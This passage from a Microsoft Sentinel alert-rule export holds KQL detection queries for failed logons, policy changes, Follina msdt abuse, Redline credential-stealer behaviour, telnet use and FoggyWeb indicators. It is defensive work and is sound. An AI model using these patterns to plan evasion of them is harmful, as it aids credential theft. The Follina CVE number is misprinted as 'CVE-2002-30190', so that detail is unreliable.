addresses.\nPLATFORM:IaaS,Windows\nMITRE:TA0001;T1190","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T20:27:30.5862188Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/5b2a1d65-62ca-4eca-8aa0-f93d772696d0","name":"5b2a1d65-62ca-4eca-8aa0-f93d772696d0","etag":"\"8700064a-0000-2700-0000-66fdc0a00000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"let main = () {\r\n    let findErrors=SigninLogs\r\n        | where TimeGenerated > ago(24h)\r\n        | where AppDisplayName == \"Azure Portal\"\r\n        | extend errorCode_ = tostring(Status.errorCode)\r\n        | where errorCode_ != \"0\"\r\n        | extend city_ = tostring(LocationDetails.city), state_ = tostring(LocationDetails.state)\r\n        | extend Results = strcat(errorCode_, \"--\", ResultDescription)\r\n        | extend temp = iif(UserDisplayName contains \",\" or UserDisplayName contains \" \", UserDisplayName, \"temp\");\r\n    let lookup = findErrors\r\n        | where temp == \"temp\"\r\n        | summarize make_set(UserDisplayName);\r\n    findErrors\r\n    | join kind=leftouter (userlookup\r\n        | where AccountObjectId in (['lookup']))\r\n        on $left.UserDisplayName == $right.AccountObjectId\r\n    | extend UserDisplayName = iif(temp == \"temp\", AccountDisplayName, UserDisplayName)\r\n    | extend Email = iif(UserPrincipalName !has '@', user, UserPrincipalName)\r\n    | project\r\n        TimeGenerated,\r\n        UserDisplayName,\r\n        Results,\r\n        IPAddress,\r\n        AuthMethod = MfaDetail.authMethod,\r\n        Email\r\n    // Remove timeouts\r\n| where Results !startswith \"70044\"\r\n};\r\nlet getCountbyResultandIPAddresses =() {\r\n    main\r\n    | summarize ResultCount = count(), IPAddress=make_set(IPAddress) by UserDisplayName, Results\r\n};\r\nlet getCountTotalbyUserandTimeStamps =() {\r\n    main\r\n    | summarize StartTime=min(TimeGenerated), EndTime=max(TimeGenerated), TotalCount = count() by UserDisplayName\r\n};\r\nmain\r\n| join (getCountbyResultandIPAddresses) on UserDisplayName, Results\r\n| extend Results = pack(\"Results\", Results, \"Count\", ResultCount)\r\n| summarize\r\n    Results = make_set(Results),\r\n    IPAddress = make_set(IPAddress1),\r\n    AuthMethod = make_set(AuthMethod)\r\n    by UserDisplayName, Email\r\n| join (getCountTotalbyUserandTimeStamps) on UserDisplayName\r\n| extend AuthMethod = iif(AuthMethod == \"[]\", \"Failed at Conditional Access; Not Triggered\", AuthMethod)\r\n| extend DrillDownQuery = strcat(\"SigninLogs | where TimeGenerated between (datetime(\", StartTime, \") .. datetime(\", EndTime, \"))\", \"|where UserDisplayName ==\", '\"', UserDisplayName, '\" | where ResultType != 0')\r\n| project\r\n    StartTime,\r\n    EndTime,\r\n    TotalCount,\r\n    Email,\r\n    UserDisplayName,\r\n    IPAddress,\r\n    AuthMethod,\r\n    Results,\r\n    DrillDownQuery\r\n| mv-expand IPAddress, Results\r\n| where IPAddress !startswith \"140.\" or TotalCount > 4\r\n| where IPAddress startswith \"140.\" or TotalCount > 4\r\n| summarize Results = make_set(Results), TotalCount = make_set(TotalCount), IPAddress = make_set(IPAddress), AuthMethod = make_set(AuthMethod) by StartTime, EndTime, Email, UserDisplayName, DrillDownQuery\r\n// **IMPORTANT** The query column holds the DrillDownQuery you can use to investigate the individual user signin failures!","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"AadUserId","columnName":"Email"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["CredentialAccess","Discovery"],"techniques":["T1110","T1087"],"displayName":"Failed Azure Portal Logons","enabled":true,"description":"This query looks for failed Azure portal logons at a certain threshold. It does not display timeouts.\nCurrent settings are failed attempts greater than 4 in a 24 hour period.\n\nPLATFORM:Azure AD,Microsoft 365,IaaS,Windows\nMITRE:TA0001;T1078;T1078.001;T1078.004,TA0004;T1078;T1078.004,TA0006;T1110;T1110.001;T1110.002;T1110.003;T1110.004","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T21:52:30.785455Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/858c5837-35ce-4560-9182-a80100a2f383","name":"858c5837-35ce-4560-9182-a80100a2f383","etag":"\"0c01e4dc-0000-2700-0000-6400b0530000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"//Author: Stephen Rowley\r\n//Description: A SharePoint policy exists that prevents external users from resharing documents and links. This setting is part of the TCG v1 and should be investigated when changed.\r\n//False Positives: Can alert on legitimate changes to the policy, but should still be investigated to confirm.\r\nOfficeActivity \r\n| where OfficeWorkload == \"SharePoint\"\r\n| where Operation == \"SharingPolicyChanged\" \r\n| where parse_json(ModifiedProperties).[0].Name == \"PreventExternalUsersFromResharing\"\r\n| extend PropertiesChanged = parse_json(ModifiedProperties).[0].Name\r\n| extend OldValue = parse_json(ModifiedProperties).[0].OldValue\r\n| extend NewValue = parse_json(ModifiedProperties).[0].NewValue\r\n| project TimeGenerated, UserId, ClientIP, EventSource, PropertiesChanged, OldValue, NewValue\r\n//MITRE\r\n//Exfiltration Over Web Service T1567","suppressionDuration":"PT1H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"AadUserId","columnName":"UserId"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"ClientIP"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Exfiltration"],"techniques":[],"displayName":"BAH_TCG-BlockExternalUsersSharing","enabled":true,"description":"A SharePoint policy exists that prevents external users from resharing documents and links. This setting is part of the TCG v1 and should be investigated when changed.","alertRuleTemplateName":null,"lastModifiedUtc":"2023-03-02T14:18:58.8470887Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/78b98b2a-07cc-4d2b-baeb-3f4d44732397","name":"78b98b2a-07cc-4d2b-baeb-3f4d44732397","etag":"\"870022c7-0000-2700-0000-66fdc8c00000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT30M","queryPeriod":"PT30M","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"// Author: Rob Russell\n// Description:\n// Analytic created in response to DTO-22-0218\n// Looks for instances of office applications making use of ms-msdt\n// MITRE ATT&CK techniques: attack.defense_evasion, attack.T1036 - Masquerading, attack.T1218 - System Binary Proxy Execution\n// for more information see \n// https://app.any.run/tasks/ecc93303-2c65-4147-88e5-7fef7e9002b7/\n// https://isc.sans.edu/forums/diary/msmsdt+RTF+Maldoc+Analysis+oledump+Plugins/28718/\n// False Positives: no known false positive all alers should be investigated\nDeviceProcessEvents\n| where (ProcessCommandLine contains \"msdt.exe\") or (ProcessCommandLine contains \"ms-msdt\")\n| where InitiatingProcessFileName in~ (\"OUTLOOK.EXE\", \"WORD.EXE\", \"EXCEL.EXE\", \"WINWORD.EXE\", \"Microsoft Outlook\", \"mspub.exe\", \"eqnedt32.exe\")\n| project\n    ProcessCommandLine,\n    InitiatingProcessCommandLine,\n    DeviceName,\n    InitiatingProcessAccountUpn,\n    InitiatingProcessAccountDomain\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":null,"groupByCustomDetails":null}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"InitiatingProcessAccountUpn"},{"identifier":"NTDomain","columnName":"InitiatingProcessAccountDomain"}]},{"entityType":"Host","fieldMappings":[{"identifier":"HostName","columnName":"DeviceName"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["DefenseEvasion"],"techniques":["T1036","T1218"],"displayName":"BAH_MSDTExecution","enabled":true,"description":"Basic query to look for activity related to follina exploit activity CVE-2002-30190\nPLATFORM:Windows\nMITRE:TA0005;T1036;T1218","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:27:12.08635Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/cb583863-486c-41c1-a843-5727a425cfdd","name":"cb583863-486c-41c1-a843-5727a425cfdd","etag":"\"8700c7ba-0000-2700-0000-66fdc7df0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT30M","queryPeriod":"PT30M","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"// Author: Rob Russell\n// Description:\n// This analytic is meant to detect behaviors related to Redline stealer\n// References\n// https://www.bitdefender.com/files/News/CaseStudies/study/415/Bitdefender-PR-Whitepaper-RedLine-creat6109-en-EN.pdf\n// https://www.bitdefender.com/blog/labs/redline-stealer-resurfaces-in-fresh-rig-exploit-kit-campaign/\n// https://threatresearch.ext.hp.com/redline-stealer-disguised-as-a-windows-11-upgrade/\n// https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555.003/T1555.003.md\n// Samples\n// https://any.run/malware-trends/redline\n// (VT Enterprise) https://www.virustotal.com/gui/file/b78615662c8c362d920c3f9273352d0da085610774f1fa5a96cda4ec50ca0507/detection\n// Common Behaviors\n// Always spawns a process called AppLaunch.exe in the .Net folder and always creates a log file in AppData\n// Reads computer name \n// Reads supported languages\n// Reads common browser locations looking for stored credentials (Info stealers and virus scanners)\n// Executables spawning Executables (lots of false positives)\n// Rar files spawning executables (Not all malware samples have done this)\n// python creating a connection (Could generate false positives)\n// False Positives: None, the behavior detected by this analytic should only detect Redline stealer activity\nDeviceProcessEvents\n| where FolderPath startswith @\"C:\\Windows\\Microsoft.NET\\Framework64\\\" and FolderPath endswith \"AppLaunch.exe\"\n| project TimeGenerated, Redline_Process_Path = FolderPath, DeviceName, AccountName, AccountDomain\n| join kind=inner (\n    DeviceFileEvents\n    | where FolderPath contains @\"AppData\\Local\\Microsoft\\CLR\" and FolderPath endswith @\".exe.log\"\n    | project Redline_Log_Path = FolderPath, DeviceName\n    ) on DeviceName\n| project TimeGenerated, Redline_Process_Path, Redline_Log_Path, DeviceName, AccountName, AccountDomain","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":null,"groupByCustomDetails":null}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"AccountName"},{"identifier":"NTDomain","columnName":"AccountDomain"}]},{"entityType":"Host","fieldMappings":[{"identifier":"HostName","columnName":"DeviceName"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Execution","CredentialAccess","Discovery","Collection"],"techniques":["T1059","T1204","T1555","T1614","T1082","T1074"],"displayName":"BAH_Redline_Stealer","enabled":true,"description":"Looks for specific behavior related to Redline Stealer malware.                                                                                                                                                                                                                                                                                                                                            \n References\n https://www.bitdefender.com/files/News/CaseStudies/study/415/Bitdefender-PR-Whitepaper-RedLine-creat6109-en-EN.pdf\n https://www.bitdefender.com/blog/labs/redline-stealer-resurfaces-in-fresh-rig-exploit-kit-campaign/\n https://threatresearch.ext.hp.com/redline-stealer-disguised-as-a-windows-11-upgrade/\n https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555.003/T1555.003.md\n Samples\nhttps://any.run/malware-trends/redline\n(VT Enterprise) https://www.virustotal.com/gui/file/b78615662c8c362d920c3f9273352d0da085610774f1fa5a96cda4ec50ca0507/detection\nPLATFORM:Windows\nMITRE:TA0006;T1555","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:23:26.5617495Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/334fb7f0-375b-4de3-9dd6-99ef5005b236","name":"334fb7f0-375b-4de3-9dd6-99ef5005b236","etag":"\"870026a3-0000-2700-0000-66fdc6330000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"//Author: Stephen Rowley\n//Description: This analytic will search for enabling and disabling of the Unified Audit Log settings.\n//False Positives: Can alert on legitimate activity, but should still be investigated to confirm.\nOfficeActivity\n| where Operation == \"Set-AdminAuditLogConfig\"\n| where Parameters contains \"UnifiedAuditLogIngestionEnabled\"\n| extend Value_0 = parse_json(Parameters)[0]\n| extend Value_1 = parse_json(Parameters)[1]\n| project TimeGenerated, Operation, UserId, ClientIP, Value_0, Value_1","suppressionDuration":"PT1H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"AadUserId","columnName":"UserId"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"ClientIP"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["DefenseEvasion"],"techniques":["T1564"],"displayName":"BAH_TCG-EnableUnifiedAuditLogging","enabled":true,"description":"This analytic will search for enabling and disabling of the Unified Audit Log settings.\nPLATFORM:Microsoft 365\nMITRE:TA0005;T1564","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:16:17.5761093Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/d6251f87-cbd2-434a-a572-1cfb376a20c2","name":"d6251f87-cbd2-434a-a572-1cfb376a20c2","etag":"\"8700e5a0-0000-2700-0000-66fdc6150000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"//Author: Stephen Rowley\n//Description: This analytic looks for changings to the Zero Hour Auto Purge (ZAP) settings for phishing and spam attempts\n//False Positives: Can alert on legitimate changes, but should still be investigated to confirm.\nOfficeActivity\n| where Operation == \"Set-HostedContentFilterPolicy\"\n| where Parameters contains \"PhishZapEnabled\" or Parameters contains \"SpamZapEnabled\"\n| extend PolicyName = parse_json(Parameters)[0].Value\n| extend SettingName_1 = parse_json(Parameters)[1].Name\n| extend SettingValue_1 = parse_json(Parameters)[1].Value\n| extend SettingName_2 = parse_json(Parameters)[2].Name\n| extend SettingValue_2 = parse_json(Parameters)[2].Value\n| project TimeGenerated, Operation, UserId, ClientIP, PolicyName, SettingName_1, SettingValue_1, SettingName_2, SettingValue_2","suppressionDuration":"PT1H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"AadUserId","columnName":"UserId"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"ClientIP"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["DefenseEvasion"],"techniques":["T1562"],"displayName":"BAH_TCG-EnableZeroHourAutoPurge","enabled":true,"description":"This analytic looks for changings to the Zero Hour Auto Purge (ZAP) settings for phishing and spam attempts\nPLATFORM:Microsoft 365,Windows,IaaS\nMITRE:TA0005;T1562","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:15:49.41984Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/d0530387-91f8-4c35-aac2-6456c675b837","name":"d0530387-91f8-4c35-aac2-6456c675b837","etag":"\"0c0140da-0000-2700-0000-6400b0060000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"//Author: Stephen Rowley\n//Description: Looks for connections on port 23 in Defender's DeviceNetworkEvents table and both telnet.exe and putty.exe processes. Additions may be made to include additional processes or behavior detection gaps.\n//False Positives: Could alert on testing activity, but Telnet generally should not be used\nDeviceNetworkEvents\n| where (RemotePort == \"23\" and InitiatingProcessCommandLine has_any(\"telnet\", \"putty\")) or (RemotePort == \"23\" and InitiatingProcessFileName has_any(\"telnet\", \"putty\"))\n| extend CommandLine = InitiatingProcessCommandLine, FileName = InitiatingProcessFileName, Result = ActionType, Account = InitiatingProcessAccountUpn, Process = InitiatingProcessParentFileName\n| project TimeGenerated, CommandLine, FileName, Result, DeviceName, Account, Process, LocalIP, LocalPort, RemoteIP, RemotePort","suppressionDuration":"PT1H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Host","fieldMappings":[{"identifier":"HostName","columnName":"DeviceName"}]},{"entityType":"Account","fieldMappings":[{"identifier":"Name","columnName":"Account"}]},{"entityType":"Process","fieldMappings":[{"identifier":"ProcessId","columnName":"Process"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"LocalIP"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"RemoteIP"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Execution"],"techniques":[],"displayName":"BAH_TelnetActivity","enabled":true,"description":"Looks for connections on port 23 in Defender's DeviceNetworkEvents table and both telnet.exe and putty.exe processes. It requires a combination of RemotePort 23 AND either \"telnet\" or \"putty\" strings in either InitiatingProcessCommandLine or InitiatingProcessFileName columns.","alertRuleTemplateName":null,"lastModifiedUtc":"2023-03-02T14:17:41.7483419Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/c1d61039-12d7-4069-8500-ffe99282657d","name":"c1d61039-12d7-4069-8500-ffe99282657d","etag":"\"a701a7d9-0000-2700-0000-636901090000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Informational","query":"// This query groups malicious URLs by Sender and produces a query for EEMSG's WCF Domain check and TSD Dashboards.\r\nlet FlaggedURL = SecurityAlert\r\n    | where AlertName has \"Email messages containing malicious URL removed after delivery\"\r\n    | extend parsedEntities = parse_json(Entities)\r\n    | mv-expand parsedEntities\r\n    | extend ref = parsedEntities['$ref']\r\n    | where isempty(ref)\r\n    | project-away ref\r\n    | extend FlaggedURL = parsedEntities.Url\r\n    | where isnotempty(FlaggedURL)\r\n    | summarize FlaggedURL = make_set(FlaggedURL);\r\n    //Produces a list URLs that were flagged by defender\r\nSecurityAlert\r\n| where AlertName has \"Email messages containing malicious URL removed after delivery\"\r\n| extend parsedEntities = parse_json(Entities)\r\n| mv-expand parsedEntities\r\n| extend ref = parsedEntities['$ref']\r\n| where isempty(ref)\r\n| project-away ref\r\n| extend Sender = parsedEntities.Sender\r\n| where isnotempty(Sender)\r\n| extend Recipient = parsedEntities.Recipient\r\n| extend Subject = parsedEntities.Subject\r\n| extend URLList = parsedEntities.Urls\r\n| mv-apply URLList on ( \r\n    where URLList  in (FlaggedURL)\r\n    )\r\n    // only returns Malicious URL out of all the URLs included in the email\r\n| extend DeliveryAction = parsedEntities.DeliveryAction\r\n| extend DeliveryLocation = parsedEntities.DeliveryLocation\r\n| extend DeliveryStatus = iif(isnotempty(Sender), strcat(DeliveryAction, \" and sent to \", DeliveryLocation), '')\r\n| extend tostring(Sender), tostring(Recipient), tostring(Subject), FlaggedURL = tostring(URLList), tostring(DeliveryLocation), tostring(DeliveryStatus), tostring(DeliveryAction), tostring(parsedEntities)\r\n| distinct Sender, Recipient, Subject, FlaggedURL\r\n| extend UrlDecontruct = split(FlaggedURL, \"/\")\r\n| extend WCFQuery = tostring(UrlDecontruct[2])\r\n| extend TSDQuery = strcat('Sender = \"*', Sender, '*\"',' OR ', ' subject = \"*', Subject, '*\"', ' AND ', ' URLs = \"*', WCFQuery, '*\"')\r\n| summarize Recipient = make_set(Recipient) by Sender,Subject, FlaggedURL, WCFQuery, TSDQuery\r\n| project Sender, Recipient, Subject, FlaggedURL, WCFQuery, TSDQuery\r\n| sort by Sender asc\r\n| extend URL_0_Url = FlaggedURL","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["InitialAccess"],"techniques":["T1566"],"displayName":"EEMSG Malicious URL TSD & WCF Query","enabled":false,"description":"This query groups malicious URLs by Sender and produces a query for EEMSG's WCF Domain check and TSD Dashboards. -- Analytic disabled 11/07/22 -- Check CI/CD submission app for reasoning.\n","alertRuleTemplateName":null,"lastModifiedUtc":"2022-11-07T12:58:49.488785Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/df0ec542-7468-4022-bd76-d27c2dddc785","name":"df0ec542-7468-4022-bd76-d27c2dddc785","etag":"\"87004d98-0000-2700-0000-66fdc58f0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"//Author: Stephen Rowley\n//Description: This TCG analytic searches for changes to three settings for Outlook Web App that are concerned with specifying the activity timeout for OWA sessions.\n//-ActivityBasedAuthenticationTimeoutEnabled (30 minutes)\n//-ActivityBasedAuthenticationTimeoutInterval (true)\n//-ActivityBasedAuthenticationTimeoutWithSingleSignOnEnabled (true)\n//Any changes to these settings will trigger an alert.\n//False Positives: This analytic could alert on legitimate activity, but should be investigated to confirm.\nOfficeActivity\n| where Operation == \"Set-OrganizationConfig\"\n| where Parameters contains \"ActivityBasedAuthenticationTimeout\"\n| extend allParams = parse_json(Parameters)\n| mv-expand allParams\n| extend Action = allParams\n| project TimeGenerated, Operation, UserId, ClientIP, Action\n//MITRE\n//Defense Evasion","suppressionDuration":"PT1H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"AadUserId","columnName":"UserId"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"ClientIP"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["DefenseEvasion"],"techniques":[],"displayName":"BAH_TCG-WebActivityTimeout","enabled":true,"description":"This TCG analytic searches for changes to three settings for Outlook Web App that are concerned with specifying the activity timeout for OWA sessions.\n\n-ActivityBasedAuthenticationTimeoutEnabled (30 minutes)\n-ActivityBasedAuthenticationTimeoutInterval (true)\n-ActivityBasedAuthenticationTimeoutWithSingleSignOnEnabled (true)\n\nAny changes to these settings will trigger an alert.\nPLATFORM:Microsoft 365\nMITRE:TA0005;T1556;T1556.006;T1556.007","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:13:35.2376378Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/91e27a31-cb1f-4f0f-a052-e7fb5c419d2c","name":"91e27a31-cb1f-4f0f-a052-e7fb5c419d2c","etag":"\"8700b10e-0000-2700-0000-66fdbcc90000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT6H","queryPeriod":"PT6H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"let iocs = externaldata(DateAdded:string,IoC:string,Type:string,TLP:string) [@\"https://raw.githubusercontent.com/Azure/Azure-Sentinel/master/Sample%20Data/Feeds/FoggyWebIOC.csv\"] with (format=\"csv\", ignoreFirstRecord=True);\nlet sha256Hashes = (iocs | where Type == \"sha256\" | project IoC);\nlet FilePaths = (iocs | where Type =~ \"FilePath\" | project IoC);\nlet POST_URI = (iocs | where Type =~ \"URI1\" | project IoC);\nlet GET_URI = (iocs | where Type =~ \"URI2\" | project IoC);\n//Include in the list below, the ADFS servers you know about in your environment.  In the next part of the query, we will try to identify them for you if you have the telemetry.\nlet ADFS_Servers1 = datatable(Computer:string)\n[ \"<ADFS01>.<DOMAIN>.<COM>\",\n\"<ADFS02>.<DOMAIN>.<COM>\"\n];\n// Automatically identify potential ADFS services in your environment by searching process event telemetry for \"Microsoft.IdentityServer.ServiceHost.exe\".\nlet ADFS_Servers2 = \n(union isfuzzy=true\n(SecurityEvent\n| where EventID == 4688 and SubjectLogonId != \"0x3e4\"\n| where ProcessName has \"Microsoft.IdentityServer.ServiceHost.exe\"\n| distinct Computer\n),\n( WindowsEvent\n| where EventID == 4688 and EventData has \"Microsoft.IdentityServer.ServiceHost.exe\" and EventData has \"0x3e4\"\n| extend ProcessName = tostring(EventData.ProcessName)\n| where ProcessName == \"Microsoft.IdentityServer.ServiceHost.exe\"\n| extend SubjectLogonId = tostring(EventData.SubjectLogonId)\n| where SubjectLogonId != \"0x3e4\"\n| distinct Computer\n),\n(DeviceProcessEvents\n| where InitiatingProcessFileName == 'Microsoft.IdentityServer.ServiceHost.exe'\n| extend Computer = DeviceName\n| distinct Computer\n),\n(Event\n| where Source == \"Microsoft-Windows-Sysmon\"\n| where EventID == 1\n| extend EventData = parse_xml(EventData).DataItem.EventData.Data\n| mv-expand bagexpansion=array EventData\n| evaluate bag_unpack(EventData)\n| extend Key=tostring(['@Name']), Value=['#text']\n| evaluate pivot(Key, any(Value), TimeGenerated, Source, EventLog, Computer, EventLevel, EventLevelName, UserName, RenderedDescription, MG, ManagementGroupName, Type, _ResourceId)\n| extend process = split(Image, '\\\\', -1)[-1]\n| where process =~ \"Microsoft.IdentityServer.ServiceHost.exe\"\n| distinct Computer\n)\n);\nlet ADFS_Servers =\nADFS_Servers1\n| union  (ADFS_Servers2 | distinct Computer);\n(union isfuzzy=true\n(DeviceNetworkEvents\n| where DeviceName in (ADFS_Servers)\n| where isnotempty(InitiatingProcessSHA256) or isnotempty(InitiatingProcessFolderPath)\n| where  InitiatingProcessSHA256 has_any (sha256Hashes) or InitiatingProcessFolderPath has_any (FilePaths)\n| project TimeGenerated, ActionType, DeviceId, DeviceName, InitiatingProcessAccountDomain, InitiatingProcessAccountName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, InitiatingProcessId,  InitiatingProcessParentFileName, InitiatingProcessFileName, RemoteIP, RemoteUrl, RemotePort, LocalIP, Type\n| extend timestamp = TimeGenerated, IPCustomEntity = RemoteIP, HostCustomEntity = DeviceName\n),\n(Event\n| where Source == \"Microsoft-Windows-Sysmon\" and EventID == '7'\n| where Computer in (ADFS_Servers)\n| extend EvData = parse_xml(EventData)\n| extend EventDetail = EvData.DataItem.EventData.Data\n| extend ImageLoaded = EventDetail.[5].[\"#text\"], Hashes = EventDetail.[11].[\"#text\"]\n| parse Hashes with * 'SHA256=' SHA256 '\",' *\n| where ImageLoaded has_any (FilePaths) or SHA256 has_any (sha256Hashes) \n| project TimeGenerated, EventDetail, UserName, Computer, Type, Source, SHA256, ImageLoaded, EventID\n| extend Type = strcat(Type,\":\",EventID, \": \", 